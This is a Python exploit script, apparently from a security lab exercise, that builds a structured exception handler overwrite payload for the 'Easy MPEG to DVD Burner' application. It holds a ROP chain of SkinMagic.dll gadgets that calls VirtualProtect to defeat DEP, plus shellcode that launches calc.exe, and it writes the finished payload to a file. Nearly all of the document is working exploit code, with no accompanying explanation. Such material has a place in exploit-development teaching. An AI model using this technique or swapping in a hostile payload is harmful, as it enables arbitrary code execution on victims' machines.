import struct

# spawns calc.exe on win 7 x64
shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7")

def create_rop_chain():
    # Register setup for VirtualProtect():
    # EAX = NOP(0x90909090)
    # ECX = lpOldProtect(ptr to W address)
    # EDX = NewProtect(0x40)
    # EBX = dwSize (0x201)
    # ESP = lPAddress(automatic)
    # EBP = ReturnTo(ptr to jmp esp)
    # ESI = ptr to VirtualProtect()
    # EDI = ROP NOP(RETN)

    rop_gadgets = [
        # Set up ESI (ptr to VirtualProtect())
        0x1003176a,  # XOR EDX,EDX # CMP EAX,DWORD PTR [ECX+8] # SETG DL # MOV EAX,EDX # RETN    ** [SkinMagic.dll] **
        0x1003629d,  # DEC EDX # JNE SKINMAGIC!SETSKINMENU+0X2F505 (10036295) # POP ESI # RETN    ** [SkinMagic.dll] **
        0x90909090,  # filler for pop esi
        0x10027e6b,  # POP EAX # RETN    ** [SkinMagic.dll] **
        0x1003b268,  # ptr to &VirtualProtect() [IAT SkinMagic.dll]
        0x10017ef9,  # ADD EDX,DWORD PTR [EAX] # RETN    ** [SkinMagic.dll] **
        0x1003993e,  # PUSH EDX # ADD AL,5F # POP ESI # POP EBX # RETN 0x0C    ** [SkinMagic.dll] **
        0x90909090,  # filler for pop ebx

        # Set up EBP (ptr to jmp esp)
        0x10028187,  # POP EBP # RETN    ** [SkinMagic.dll] **
        0x90909090,  # filler for retn 0x0c
        0x90909090,  # filler for retn 0x0c
        0x90909090,  # filler for retn 0x0c
        0x10028187,  # skip 4 bytes [SkinMagic.dll]

        # Set up EBX (dwSize(0x201))
        0x10027e6b,  # POP EAX # RETN    ** [SkinMagic.dll] **
        0x6f6f7171,  # 0x90909090 + 0x6f6f7171 = 0x201 after carry over
        0x1003174d,  # ADD EBX,EAX # MOV EAX,DWORD PTR [ECX+10H] # XOR EDX,EDX # CMP EAX,DWORD PTR [ECX+8] # SETGE DL # MOV AL,DL # RETN    ** [SkinMagic.dll] **

        # Set up EDX (NewProtect(0x40))
        0x10027e6b,  # POP EAX # RETN    ** [SkinMagic.dll] **
        0x1005a0a0,  # Address containing 0x3f  ** [SkinMagic.dll] **
        0x10017ef9,  # ADD EDX,DWORD PTR [EAX] # RETN    ** [SkinMagic.dll] **

        # Set up ECX (ptr to W address)
        0x10039e2a,  # POP ECX # RETN    ** [SkinMagic.dll] **
        0x10043143,  # &Writable location    ** [SkinMagic.dll] **

        # Set up EDI (ROP NOP)
        0x100362ac,  # POP EDI # RETN    ** [SkinMagic.dll] **
        0x100299d5,  # RETN  ** [SkinMagic.dll] **

        # PUSHAD
        0x10027e6b,  # POP EAX # RETN    ** [SkinMagic.dll] **
        0xffbf8aab,  # Negated address 0x00407555 which contains PUSHAD # RETN
        0x1001f629,  # NEG EAX # RETN    ** [SkinMagic.dll] **
        0x1003248d,  # PUSH EAX # RETN    ** [SkinMagic.dll] **

        # jmp to ESP
        0x1001cc57,  # ptr to 'push esp # ret ' [SkinMagic.dll]
    ]
    return ''.join(struct.pack('<L', _) for _ in rop_gadgets)


rop_chain = create_rop_chain()
seh = struct.pack('<L', 0x004043ee)  # ADD ESP,7D4 # RETN    ** [Easy MPEG to DVD Burner.exe] **
padding = "A" * 148
padding2 = "F" * (1012 - len(padding) - len(rop_chain) - len(shellcode))
payload = padding + rop_chain + shellcode + padding2 + seh

with open("C:\Users\AppSec\Desktop\Lab 6\payload.txt", "w") as f:
  f.write(payload)
  print "Payload written to " + f.name
